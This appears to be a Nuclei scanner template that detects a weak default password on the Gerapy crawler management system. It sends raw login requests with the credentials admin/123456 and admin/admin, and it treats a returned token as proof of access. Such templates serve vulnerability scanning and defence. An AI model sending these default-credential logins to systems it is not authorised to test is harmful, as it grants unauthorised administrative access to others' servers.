id: gerapy-weak-password
info:
  name: Gerapy Crawler Management System Weak Password Vulnerability
  author: ProjectDiscoveryAI
  severity: medium
  tags: weak-password
http:
  - raw:
      - |
        POST /api/user/auth HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"username":"admin","password":"123456"}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 400
      - type: word
        part: header
        words:
          - "CPython"
      - type: word
        part: body
        words:
          - "\"non_field_errors\":[\"Unable to log in with provided credentials.\"]"
      - type: word
        part: body
        words:
          - "<"
        negative: true
  - raw:
      - |
        POST /api/user/auth HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"username":"admin","password":"admin"}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "CPython"
      - type: word
        part: body
        words:
          - "token"
      - type: word
        part: body
        words:
          - "<"
        negative: true
